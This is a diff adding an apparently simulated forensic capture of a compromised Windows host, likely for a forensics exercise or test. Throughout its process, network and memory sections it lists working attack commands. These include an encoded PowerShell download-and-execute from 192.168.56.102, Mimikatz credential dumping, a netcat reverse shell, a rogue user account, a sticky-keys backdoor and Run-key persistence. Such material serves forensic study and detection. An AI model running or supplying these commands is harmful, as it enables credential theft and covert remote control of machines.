@@ -1,0 +1,34 @@
+=========== SYSTEM PROCESS LIST ==========
+PROCESS_NAME: System PID: 4
+PROCESS_NAME: smss.exe PID: 252
+PROCESS_NAME: csrss.exe PID: 344
+PROCESS_NAME: wininit.exe PID: 412
+PROCESS_NAME: services.exe PID: 524
+PROCESS_NAME: lsass.exe PID: 532
+PROCESS_NAME: svchost.exe PID: 892
+PROCESS_NAME: explorer.exe PID: 1220
+PROCESS_NAME: svchost.exe PID: 1340
+PROCESS_NAME: powershell.exe PID: 1876
+COMMAND_LINE: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -NonI -W Hidden -Exec Bypass -Enc JHMgPSAoTmV3LU9iamVjdCBOZXQuV2ViY2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzE5Mi4xNjguNTYuMTAyL3BheWxvYWQucHMxJyk7IEludm9rZS1FeHByZXNzaW9uICRz
+PROCESS_NAME: mimikatz.exe PID: 3452
+COMMAND_LINE: "C:\Temp\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
+PROCESS_NAME: netcat.exe PID: 4888
+COMMAND_LINE: "C:\Temp\netcat.exe" 192.168.56.102 4444 -e cmd.exe
+
+=========== NETWORK CONNECTIONS ==========
+192.168.1.5:52134 -> 192.168.56.102:4444
+192.168.1.5:52136 -> 192.168.56.102:443
+192.168.1.5:52140 -> 104.21.17.144:443
+127.0.0.1:49152 -> 127.0.0.1:1337
+
+=========== MEMORY STRINGS ==========
+GET /payload.ps1 HTTP/1.1
+Host: 192.168.56.102
+cmd.exe /c net user hacker Pass123! /add
+sekurlsa::logonpasswords
+privilege::debug
+lsadump::sam
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass
+copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.bak
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\Temp\netcat.exe 192.168.56.102 4444 -e cmd.exe -d"
